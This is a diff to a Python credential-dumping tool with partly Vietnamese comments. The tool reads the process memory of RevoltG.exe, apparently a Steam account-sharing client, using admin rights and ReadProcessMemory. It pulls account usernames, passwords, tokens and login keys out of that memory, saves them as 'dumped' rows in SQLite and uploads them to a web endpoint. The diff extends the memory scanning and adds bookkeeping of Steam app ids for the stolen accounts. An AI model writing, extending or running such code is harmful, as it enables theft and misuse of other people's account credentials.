@@ -336,7 +336,7 @@ def init_db():
                  )''')
     
     # Upgrade DB schema to include full information
-    new_columns = ['game_id', 'game_name', 'client_id', 'token', 'machine_id', 'login_key', 'expires', 'persona_name']
+    new_columns = ['game_id', 'game_name', 'client_id', 'token', 'machine_id', 'login_key', 'expires', 'persona_name', 'steam_appid']
     for col in new_columns:
         try:
             c.execute(f"ALTER TABLE accounts ADD COLUMN {col} TEXT")
@@ -411,22 +411,26 @@ def upload_db_accounts_to_web(conn, steam_path=None):
     c = conn.cursor()
     try:
         rows = list(c.execute(
-            "SELECT username, password, game_id, game_name, steam_id FROM accounts"
+            "SELECT username, password, game_id, game_name, steam_id, steam_appid"
+            " FROM accounts"
         ))
     except sqlite3.OperationalError:
         return 0
 
     sent = 0
-    for username, password, game_id, game_name, steam_id in rows:
+    for username, password, game_id, game_name, steam_id, steam_appid in rows:
         if not username or not password:
             continue
         # Khong bo qua tai khoan da co tren web: POST /api/revolt upsert theo
         # username, nen gui lai chi lam moi ghi chu (vd ten game vua dien trong
         # game_map.txt) ma khong tao dong trung.
         # Re-resolve the name: a game_map.txt entry or a Steam API answer may
-        # have turned up since the row was first written. An unnamed AppID keeps
-        # its "App <id>" label so the id is not lost from the web note.
-        resolved, _src = resolve_game_name(game_id, steam_path, game_name, username)
+        # have turned up since the row was first written. The Steam app id is
+        # passed too, because it is what the store and the local appmanifests
+        # can actually resolve. An unnamed game keeps its "App <id>" label so
+        # the id is not lost from the web note.
+        resolved, _src = resolve_game_name(game_id, steam_path, game_name, username,
+                                           steam_appid)
         label = resolved or (game_name if game_name and
                              str(game_name) != 'N/A' else None)
         if not label and game_id and str(game_id) not in ('N/A', '0', 'None', ''):
@@ -447,8 +451,8 @@ def save_account_to_db(conn, info):
     c = conn.cursor()
     c.execute("""
         INSERT OR REPLACE INTO accounts 
-        (username, password, steam_id, game_id, game_name, client_id, token, machine_id, login_key, expires, persona_name) 
-        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
+        (username, password, steam_id, game_id, game_name, client_id, token, machine_id, login_key, expires, persona_name, steam_appid) 
+        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
     """, (
         info.get('username'),
         info.get('password') or info.get('encrypted_password'),
@@ -460,9 +464,43 @@ def save_account_to_db(conn, info):
         info.get('machine_id'),
         info.get('login_key'),
         info.get('expires'),
-        info.get('persona_name')
+        info.get('persona_name'),
+        info.get('steam_appid')
     ))
     conn.commit()
+
+def backfill_account_metadata(conn, username, steam_appid=None, game_id=None,
+                              game_name=None):
+    """Fill in fields a row was stored without, without re-dumping the account.
+
+    A row written by an older run has no steam_appid, and the scan deliberately
+    skips accounts already in the database, so that gap would otherwise stay
+    open forever and the account could never be named. Only fills blanks, so a
+    value already present is never overwritten.
+    """
+    sets, vals = [], []
+    for col, val in (('steam_appid', steam_appid), ('game_id', game_id),
+                     ('game_name', game_name)):
+        if not val or str(val) in ('N/A', 'None', '0'):
+            continue
+        if str(val).startswith('App '):
+            continue
+        # Only ever fill a gap: an existing value is left exactly as it is.
+        sets.append(f'{col} = COALESCE(NULLIF({col}, ?), ?)')
+        vals.extend(['', val])
+    if not sets:
+        return False
+    try:
+        c = conn.cursor()
+        c.execute(f"UPDATE accounts SET {', '.join(sets)} WHERE username = ?",
+                  vals + [username])
+        # Without this the edit is lost: no later save_account_to_db runs when
+        # the scan found nothing new, and the process just exits.
+        conn.commit()
+        return c.rowcount > 0
+    except sqlite3.OperationalError:
+        return False
+
 
 def is_bnet_account_dumped(conn, email):
     """Check if the bnet account is already in the database."""
@@ -731,13 +769,72 @@ def _revoltg_cache_texts():
                     yield text
 
 
+def _revoltg_ram_texts():
+    """Yield decoded regions of RevoltG's memory that hold the game catalogue.
+
+    The HTTP cache only ever holds the pages RevoltG happened to fetch, so an
+    appid can sit in a gap that nothing on disk covers. RevoltG keeps the
+    currently loaded page of its game list in memory, so reading it fills in a
+    different slice of the id space each run and the two sources together cover
+    far more than either alone.
+
+    Only regions that literally contain "steam_id" are decoded, which keeps the
+    cost proportional to the catalogue rather than to the process size.
+    """
+    if not ctypes.windll.shell32.IsUserAnAdmin():
+        return
+    for pid in get_pids('RevoltG.exe'):
+        handle = kernel32.OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION,
+                                      False, pid)
+        if not handle:
+            continue
+        try:
+            mbi = MEMORY_BASIC_INFORMATION()
+            addr = 0
+            while addr < 0x7FFFFFFFFFFF:
+                if not kernel32.VirtualQueryEx(handle, ctypes.c_void_p(addr),
+                                               ctypes.byref(mbi),
+                                               ctypes.sizeof(mbi)):
+                    break
+                size = int(mbi.RegionSize or 0)
+                base = int(mbi.BaseAddress or 0)
+                if size <= 0:
+                    break
+                nxt = base + size
+                if nxt <= addr:
+                    break
+                addr = nxt
+                if (mbi.State != 0x1000) or (mbi.Protect & 0x101):
+                    continue        # not committed, or guarded / no-access
+                if size > 64 << 20:
+                    size = 64 << 20
+                buf = ctypes.create_string_buffer(size)
+                br = ctypes.c_size_t(0)
+                if not kernel32.ReadProcessMemory(handle, ctypes.c_void_p(base),
+                                                  buf, size, ctypes.byref(br)):
+                    continue
+                data = buf.raw[:br.value]
+                if b'steam_id' not in data:
+                    continue
+                yield data.decode('utf-8', 'replace')
+        except OSError:
+            continue
+        finally:
+            kernel32.CloseHandle(handle)
+
+
 def load_revoltg_catalogue():
-    """Return {revolt_appid: (name, steam_id)} from RevoltG's own cache.
+    """Return {revolt_appid: (name, steam_id)} from RevoltG itself.
+
+    Two live sources are merged with the disk mirror: RevoltG's HTTP cache
+    (which holds whichever pages it fetched) and RevoltG's memory (which holds
+    whichever page is currently loaded). Neither is complete on its own, so an
+    appid absent from one is often present in the other.
 
     Matching tolerates any field order: the arrays differ in shape ("hot_games"
     carries a "time" field), and a pattern that fixed the order dropped 28 of
     78 games. The result is cached in memory and mirrored to disk, so a run
-    before RevoltG has ever filled its cache still resolves names.
+    before RevoltG has ever been opened still resolves names.
     """
     global _REVOLTG_CATALOGUE
     if _REVOLTG_CATALOGUE is not None:
@@ -776,27 +873,34 @@ def load_revoltg_catalogue():
     # items ("Launch Trailer", "....mp4"), which are all shaped like
     # {"id":..,"name":..} and so slipped in before this was checked. Naming an
     # account "Launch Trailer" or "Hành động" is worse than naming it nothing.
-    games = {}
-    for text in _revoltg_cache_texts():
-        # RevoltG's responses arrive HTML-escaped, so &quot; has to go first.
-        plain = html.unescape(text)
-        if '"id"' not in plain:
-            continue
-        for m in obj_re.finditer(plain):
-            body = m.group(0)
-            steam_m = steam_re.search(body)
-            if not steam_m:
+    def parse(texts, into):
+        for text in texts:
+            # HTTP responses arrive HTML-escaped, so &quot; has to go first.
+            plain = html.unescape(text)
+            if '"id"' not in plain:
                 continue
-            name_m = name_re.search(body)
-            if not name_m:
-                continue
-            try:
-                gname = json.loads('"' + name_m.group(1) + '"')
-            except ValueError:
-                gname = name_m.group(1)
-            gname = ' '.join(gname.split())   # drops the stray leading \r\n
-            if gname:
-                games.setdefault(m.group(1), (gname, steam_m.group(1)))
+            for m in obj_re.finditer(plain):
+                body = m.group(0)
+                steam_m = steam_re.search(body)
+                if not steam_m:
+                    continue
+                name_m = name_re.search(body)
+                if not name_m:
+                    continue
+                try:
+                    gname = json.loads('"' + name_m.group(1) + '"')
+                except ValueError:
+                    gname = name_m.group(1)
+                gname = ' '.join(gname.split())   # drops the stray leading \r\n
+                if gname:
+                    into.setdefault(m.group(1), (gname, steam_m.group(1)))
+        return into
+
+    # The disk mirror and the two live sources are merged, not overwritten. It
+    # used to be reset right before the parse, which threw the mirror away
+    # every run, so clearing RevoltG's cache made every name unresolvable.
+    parse(_revoltg_cache_texts(), games)
+    parse(_revoltg_ram_texts(), games)
 
     if games:
         try:
@@ -811,9 +915,25 @@ def load_revoltg_catalogue():
 
 
 def revoltg_catalogue_name(game_id):
-    """Name RevoltG itself uses for this AppID, or (None, '')."""
+    """Name RevoltG itself uses for this id, or (None, '')."""
     entry = load_revoltg_catalogue().get(str(game_id))
     return (entry[0], entry[1]) if entry else (None, '')
+
+
+def revoltg_catalogue_name_by_steam(steam_id):
+    """Name for a Steam app id, taken from RevoltG's catalogue.
+
+    The catalogue is keyed by RevoltG's own row number, so an id that is only
+    known by its Steam app can still be named by scanning the other way. This
+    is what covers a game whose row number this run has not seen loaded.
+    """
+    steam_id = str(steam_id or '')
+    if not steam_id or steam_id in ('N/A', '0', 'None', ''):
+        return None
+    for _rid, (gname, cat_steam) in load_revoltg_catalogue().items():
+        if cat_steam == steam_id:
+            return gname
+    return None
 
 GAME_MAP_HEADER = """# Ten game theo AppID cua RevoltG
 #
@@ -1008,28 +1128,37 @@ def remember_account_game(username, game_name, appid=None):
     return True
 
 
-def resolve_game_name(game_id, steam_path=None, payload_name=None, username=None):
-    """Best available name for an AppID, plus how it was determined.
+def resolve_game_name(game_id, steam_path=None, payload_name=None, username=None,
+                      steam_appid=None):
+    """Best available name for an account's game, plus how it was determined.
+
+    Two different ids are involved and only one of them means anything outside
+    RevoltG. ``game_id`` is RevoltG's own row number ("gameId" in its payload);
+    ``steam_appid`` is the real Steam app ("steamId" in the same payload). The
+    Steam store, every local appmanifest and the running-game lookup all need
+    the second one, and looking them up with the first is why so many accounts
+    came out nameless.
 
     Returns (name, source). Sources, most to least trustworthy:
+      account - a name already confirmed for this exact account
       map     - game_map.txt, set by the user
       revolt  - the name RevoltG itself put in its own payload
-      catalog - RevoltG's own game catalogue, read from its HTTP cache
+      catalog - RevoltG's own game catalogue, read from its cache and memory
       local   - appmanifest of the game installed on this machine
       api     - the Steam store
       running - the game Steam reports as currently running
-    An AppID nothing can name resolves to None, and the caller reports it as
+    An id nothing can name resolves to None, and the caller reports it as
     unknown rather than inventing a name.
     """
     if not game_id or str(game_id) in ('N/A', '0', 'None', ''):
         return (payload_name or None), ('revolt' if payload_name else None)
 
     game_id = str(game_id)
+    steam_appid = str(steam_appid) if steam_appid else ''
 
     # 1. Name already confirmed for this specific account. A per-account memory
-    #    is checked first because the appid cannot be assumed to be a stable
-    #    identifier: RevoltG may hand out a different number per account, in
-    #    which case an appid-wide table would name the next account wrongly.
+    #    is checked first because gameId is RevoltG's own numbering, which is
+    #    only meaningful together with the account it was read for.
     if username:
         pinned = load_account_game_names().get(str(username))
         if pinned:
@@ -1044,8 +1173,7 @@ def resolve_game_name(game_id, steam_path=None, payload_name=None, username=None
     if payload_name and not str(payload_name).startswith('App '):
         return str(payload_name), 'revolt'
 
-    # 3. RevoltG's own catalogue. This is the only source that knows its fake
-    #    AppIDs, so it goes before anything Steam-related.
+    # 3. RevoltG's own catalogue, keyed by its own id.
     cat_name, cat_steam = revoltg_catalogue_name(game_id)
     if cat_name:
         if cat_steam and cat_steam != game_id:
@@ -1054,23 +1182,40 @@ def resolve_game_name(game_id, steam_path=None, payload_name=None, username=None
             APP_NAME_CACHE.setdefault(cat_steam, cat_name)
         return cat_name, 'catalog'
 
+    # 3b. The same catalogue keyed by Steam id, which covers the games whose
+    #     RevoltG row number this run has not seen loaded.
+    if steam_appid:
+        by_steam = revoltg_catalogue_name_by_steam(steam_appid)
+        if by_steam:
+            APP_NAME_CACHE.setdefault(steam_appid, by_steam)
+            return by_steam, 'catalog'
+
     # 3. The built-in table of hand-verified ids.
     name = APP_NAME_CACHE.get(game_id)
     if name:
         return name, 'cache'
 
+    # 3c. The real Steam app id, which is the one every source below understands.
+    if steam_appid and steam_appid != game_id:
+        name = APP_NAME_CACHE.get(steam_appid)
+        if name:
+            return name, 'cache'
+
     # 4. Installed on this machine, in any Steam library.
-    name = get_game_name_from_appmanifest(steam_path, game_id)
+    name = get_game_name_from_appmanifest(steam_path, steam_appid or game_id)
     if name:
         return name, 'local'
-    name = get_installed_app_name(steam_path, game_id)
+    name = get_installed_app_name(steam_path, steam_appid or game_id)
     if name:
         return name, 'local'
 
-    # 5. The Steam store.
-    name = get_steam_app_name(game_id, steam_path)
-    if name:
-        return name, 'api'
+    # 5. The Steam store. Tried with the real Steam app id first, then with
+    #    RevoltG's own id, which occasionally is a Steam app id of its own.
+    for candidate in (steam_appid, game_id):
+        if candidate and candidate not in ('N/A', '0', 'None', ''):
+            name = get_steam_app_name(candidate, steam_path)
+            if name:
+                return name, 'api'
 
     return None, None
 
@@ -1277,15 +1422,24 @@ def extract_json_credentials(all_strings):
             if n_match:
                 game_name = n_match.group(1)
             
-            # Match appId explicitly first
+            # Two different numbers live in this payload and they are not
+            # interchangeable: gameId is RevoltG's own row number, steamId is
+            # the Steam app. Only the second one means anything outside
+            # RevoltG, and the two sit in different RAM hits for the same
+            # account, so a hit carrying only steamId used to overwrite the
+            # gameId seen in another hit and the account lost both.
             a_match = re.search(r'"appId"\s*:\s*"?(\d+)"?', ctx)
-            if a_match:
-                game_id = a_match.group(1)
-            else:
-                # Fallback to gameId or steamId
-                g_match = re.search(r'"(?:gameId|steamId)"\s*:\s*"?(\d+)"?', ctx)
-                if g_match:
-                    game_id = g_match.group(1)
+            g_match = re.search(r'"gameId"\s*:\s*"?(\d+)"?', ctx)
+            game_id = (a_match or g_match).group(1) if (a_match or g_match) else ''
+
+            steam_appid = ''
+            s_match = re.search(r'"steamId"\s*:\s*"?(\d+)"?', ctx)
+            if s_match:
+                steam_appid = s_match.group(1)
+            if not steam_appid:
+                s2 = re.search(r'"steam_id"\s*:\s*"?(\d+)"?', ctx)
+                if s2:
+                    steam_appid = s2.group(1)
             
             # If we extracted both, pre-seed the global cache with this exact name so we don't lose it
             if game_id and game_name and game_id != '0':
@@ -1322,7 +1476,7 @@ def extract_json_credentials(all_strings):
                 'password': password,
                 'gameId': game_id,
                 'gameName': game_name,
-                'steamId': game_id, # for compatibility
+                'steamAppId': steam_appid,
                 'clientId': client_id,
                 'expires': expires,
                 'token': token,
@@ -1813,9 +1967,22 @@ def main():
             accounts[acc]['username'] = acc
             if cred.get('password'): accounts[acc]['encrypted_password'] = cred.get('password')
             
-            game_id_val = cred.get('gameId') or cred.get('steamId') or cred.get('appId') or ''
-            if game_id_val: accounts[acc]['game_id'] = game_id_val
-            
+            # RevoltG's row number and the Steam app are kept apart, and the
+            # first hit that carries one wins. Overwriting on every hit made
+            # whichever field the last hit happened to carry the only one left.
+            game_id_val = cred.get('gameId') or cred.get('appId') or ''
+            if game_id_val and not accounts[acc].get('game_id'):
+                accounts[acc]['game_id'] = game_id_val
+
+            steam_appid_val = cred.get('steamAppId') or ''
+            if steam_appid_val and not accounts[acc].get('steam_appid'):
+                accounts[acc]['steam_appid'] = steam_appid_val
+
+            # An account whose only id is a Steam app is still nameable, so the
+            # Steam app stands in as the lookup key rather than being dropped.
+            if not accounts[acc].get('game_id') and accounts[acc].get('steam_appid'):
+                accounts[acc]['game_id'] = accounts[acc]['steam_appid']
+
             game_name_val = cred.get('gameName') or ''
             if game_name_val and not game_name_val.startswith('App '): 
                 accounts[acc]['game_name'] = game_name_val
@@ -1852,14 +2019,30 @@ def main():
     # Filter out accounts that don't have a plaintext password or are already dumped
     already_dumped = 0
     no_password = 0
+    backfills = []
     for k, v in accounts.items():
+        dumped = is_account_dumped(db_conn, k)
         if v.get('password'):
-            if not is_account_dumped(db_conn, k):
+            if not dumped:
                 new_accounts[k] = v
             else:
                 already_dumped += 1
         else:
             no_password += 1
+        # Metadata is carried across for every account the scan saw, password or
+        # not. RevoltG keeps only the encrypted form for some accounts, so
+        # those never become dump rows, but their payload still names the game
+        # and skipping them left it unused.
+        if dumped and backfill_account_metadata(
+                db_conn, k, v.get('steam_appid'), v.get('game_id'),
+                v.get('game_name')):
+            backfills.append(f'{k} (gameId={v.get("game_id") or "-"}, '
+                             f'steamId={v.get("steam_appid") or "-"})')
+    if backfills:
+        print(f"{C.DIM}[*] Bo sung thong tin cho {len(backfills)} tai khoan da luu:"
+              f"{C.RESET}")
+        for line in backfills:
+            print(f"{C.DIM}      {line}{C.RESET}")
 
     accounts = new_accounts
     scan_seen = len(accounts) + already_dumped + no_password
@@ -2009,17 +2192,20 @@ def main():
                 and str(mem_game_id) not in ('N/A', '0', 'None', '')):
             learned.setdefault(str(mem_game_id), running_name)
             
-        # Tên game: ưu tiên game_map.txt, rồi tên RevoltG tự khai, rồi Steam
-        # local/store. AppID giả của RevoltG không nguồn nào tra được -> ghi
-        # "App <id>" và đẩy vào game_map.txt để user điền tên một lần.
+        # Tên game: ưu tiên tên đã ghim cho acc này, rồi game_map.txt, rồi tên
+        # RevoltG tự khai, rồi danh mục của RevoltG, rồi Steam. Steam AppID
+        # thật đi kèm acc nên tên tra được kể cả khi gameId của RevoltG chưa
+        # từng được nạp. Không nguồn nào trả được -> ghi "App <id>" và nhờ user
+        # điền tên một lần.
         game_name_ext = info.get('game_name')
         if not game_name_ext or game_name_ext.startswith('App '):
             # Một RAM hit khác có thể đã biết tên của AppID này
             if game_id in REVOLT_NAME_CACHE:
                 game_name_ext = REVOLT_NAME_CACHE[game_id]
 
+        steam_appid = info.get('steam_appid') or ''
         game_name, name_source = resolve_game_name(
-            game_id, steam_path, game_name_ext, username)
+            game_id, steam_path, game_name_ext, username, steam_appid)
 
         if not game_name:
             game_name = f"App {game_id}"
@@ -2030,6 +2216,7 @@ def main():
         # Override metadata with the more accurate info
         info['game_id'] = game_id
         info['game_name'] = game_name
+        info['steam_appid'] = steam_appid
         client_id = info.get('revolt_client_id') or 'N/A'
         expires = info.get('expires') or ''
         token = info.get('token') or ''
